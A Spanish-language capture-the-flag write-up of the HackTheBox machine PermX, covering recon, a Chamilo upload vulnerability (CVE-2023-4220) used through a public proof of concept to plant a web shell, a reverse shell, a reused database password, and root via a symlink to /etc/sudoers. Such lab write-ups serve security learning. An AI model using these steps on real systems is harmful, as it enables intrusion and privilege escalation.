---
title: HackTheBox PermX Writeup
published: true
---


PermX comienza con Chamilo, una plataforma de educación en línea. Aprovecharé una vulnerabilidad de carga de archivos para obtener un shell web y ejecutarlo en la máquina. A partir de ahí, pasaré las credenciales compartidas al siguiente usuario. Para escalar a root, abusaré de un script que me permite manipular las listas de control de acceso a archivos de Linux mediante enlaces simbólicos para eludir las protecciones. Mostraré varias maneras de abusar de esto, un par de métodos que no funcionan y explicaré por que :


![Captura de pantalla de la web](assets/images/PermX/imagen2.png)


- [Reconocimiento](#Reconocimiento)
- [lms.permx.htb](#lms.permx.htb)
- [shell-data](#Shell como www-data)
- [Shell-mtz](#Shell como mtz)
- [Shell-root](#Shell como root)
- [🛠Paso-a-paso](#🛠 Paso a paso)



# [](#header-1)Reconocimiento

nmap encuentra dos puertos TCP abiertos, SSH (22) y HTTP (80):

```nmap
jorge@hacky$ nmap -p- --min-rate 10000 10.10.11.23
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
Nmap scan report for 10.10.11.23
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.23
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
Nmap scan report for 10.10.11.23
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

Según las versiones de OpenSSH y Apache , es probable que el host esté ejecutando Ubuntu 22.04 jammy.

Hay una redirección en el servidor web a permx.htb.


## [](#header-2)Fuzz de subdominio - TCP 80


Debido a que la pagina que esta expuesta por el puerto 80 es muy estatica usare Fuzz de subdominio para encontrar otros dominios que esten en el servidor web.

![Captura de pantalla de la web](assets/images/PermX/imagen1.webp)


Debido a que el sitio claramente enruta las solicitudes HTTP en función del nombre de host, usaré ffuf para fuzzear los subdominios para permx.htbver si alguno responde de manera diferente:

```Fuzz
jorge@hacky$ ffuf -u http://10.10.11.23 -H "Host: FUZZ.permx.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.23
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 88ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 122ms]
:: Progress: [19966/19966] :: Job [1/1] :: 458 req/sec :: Duration: [0:00:45] :: Errors: 0 ::

```

Agregaré el dominio base así como ambos subdominios a mi /etc/hosts archivo:

```
https://0xdf.gitlab.io/2024/11/02/htb-permx.html#permxhtb---tcp-80
```

# [](#header-1)lms.permx.htb

## [](#header-2)Sitio

Este sitio ofrece un formulario de inicio de sesión para una instancia de Chamilo:

![Captura de pantalla de la web](assets/images/PermX/imagen3.webp)

En la parte inferior, obtendré el nombre de administrador "Davis Miller" con el correo electrónico "admin@permx.htb".

Chamilo es una plataforma de formación online basada en PHP. También está alojada en GitHub .


# [](#header-1)Shell como www-data

## [](#header-2)Identificar CVE

Inmediatamente busqué en línea vulnerabilidades de Chamilo y encontré CVE-2023-4220 y un repositorio de GitHub através del cual podía ejecutar comandos remotos.

[Repositorio de Github](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git) .

En “Webshell” se especificó un comando que utilicé después de haber descargado el repositorio.

![Captura de pantalla de la web](assets/images/PermX/imagen4.webp)

Después de ejecutar exitosamente el comando, recibí una URL bajo la cual debería tener la ejecución remota del comando.

```
python3 main.py -u http://lms.permx.htb/ -a webshell
```

Como se muestra en la captura de pantalla a continuación, funciona.

![Captura de pantalla de la web](assets/images/PermX/imagen6.webp)


Para obtener una shell inversa, usé la herramienta "Python3 shortest" de revshells.com . No olvides ajustar la IP del atacante y el puerto de escucha.

![Captura de pantalla de la web](assets/images/PermX/imagen7.webp)


Antes de ejecutarlo, inicié un oyente netcat.

![Captura de pantalla de la web](assets/images/PermX/imagen8.webp)


# [](#header-1)Shell como mtz
## [](#header-2)Enumeración

Solo hay un usuario con un directorio de inicio y un shell:

```
www-data@permx:/home$ ls
mtz
www-data@permx:/home$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

www-data no puede acceder ni al mtzdirectorio ni al /root.

Sitios web

Hay dos carpetas en /var/www:

```
www-data@permx:/var/www$ ls
chamilo  html
```

html tiene el sitio estático que es permx.htb:

```
www-data@permx:/var/www$ ls html/
404.html  LICENSE.txt  READ-ME.txt  about.html  contact.html  courses.html  css  elearning-html-template.jpg  img  index.html  js  lib  scss  team.html  testimonial.html
```

chamilo tiene la instancia de Chamilo

```
www-data@permx:/var/www$ ls chamilo/
CODE_OF_CONDUCT.md  README.md             bin           cli-config.php  composer.lock  favicon.ico  license.txt    plugin      terms.php     vendor       whoisonline.php
CONTRIBUTING.md     app                   bower.json    codesize.xml    custompages    favicon.png  main           robots.txt  user.php      web          whoisonlinesession.php
LICENSE             apple-touch-icon.png  certificates  composer.json   documentation  index.php    news_list.php  src         user_portal.phpweb.config
```

El cli-config.phparchivo no tiene ninguna credencial, pero tiene una referencia a otro archivo de configuración:

```
$configurationFile = __DIR__.'/app/config/configuration.php';
```

Ese archivo es muy largo, pero comienza con la información de conexión a la base de datos:

```php
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000                                                              
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.                                     
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.                                               
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.                                                     
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
...[snip]...
```

La contraseña es “03F6lY3uXAP2bkW8”.


## [](#header-2)su / SSH

Esa contraseña se comparte como contraseña para el usuario mtz. sucambiará a ese usuario:

```
www-data@permx:/var/www/chamilo$ su mtz
Password: 
mtz@permx:/var/www/chamilo$

```

Y puedo leer user.txt:

```
mtz@permx:~$ cat user.txt
0a5f7505************************

```

# [](#header-1)Shell como root

No hay nada de interés en el directorio de inicio de mtz:

```
mtz@permx:~$ ls -la
total 32
drwxr-x--- 4 mtz  mtz  4096 Jun  6 05:24 .
drwxr-xr-x 3 root root 4096 Jan 20 18:10 ..
lrwxrwxrwx 1 root root    9 Jan 20 18:12 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31 11:14 .cache
lrwxrwxrwx 1 root root    9 Jan 20 18:37 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20 18:10 .ssh
-rw-r----- 1 root mtz    33 Jan 20 18:16 user.txt
```

## [](#header-2)sudo

mtz puede ejecutar un script Bash como cualquier usuario con sudo:

```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

## [](#header-2)acl.sh

El script permite al usuario configurar la lista de control de acceso a archivos (FACL) para un archivo:


```sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

Para escalar a root usando el script /opt/acl.sh, puedes aprovechar un symlink para modificar un archivo crítico del sistema que te otorgue permisos de sudo o directamente root shell. Vamos a usar /etc/sudoers, aunque podría usarse /etc/shadow si prefieres crackear la contraseña, este método es más directo.


# [](#header-1)🛠 Paso a paso

1. Crea un symlink en tu home que apunte al archivo /etc/sudoers:


```
ln -s /etc/sudoers /home/mtz/sudoers_link
```

2. Usa el script ACL para darte permiso de escritura sobre ese symlink (que en realidad es /etc/sudoers):


```
sudo /opt/acl.sh mtz rw /home/mtz/sudoers_link
```

3. Edita el sudoers, añadiendo una línea NOPASSWD para ti. Como ahora tienes permiso de escritura en /etc/sudoers, puedes hacerlo directamente:

```
echo "mtz ALL=(ALL) NOPASSWD:ALL" >> /home/mtz/sudoers_link
```

4. Ya puedes invocar sudo como root sin contraseña:

```
sudo su -
```

¡Y serás root!

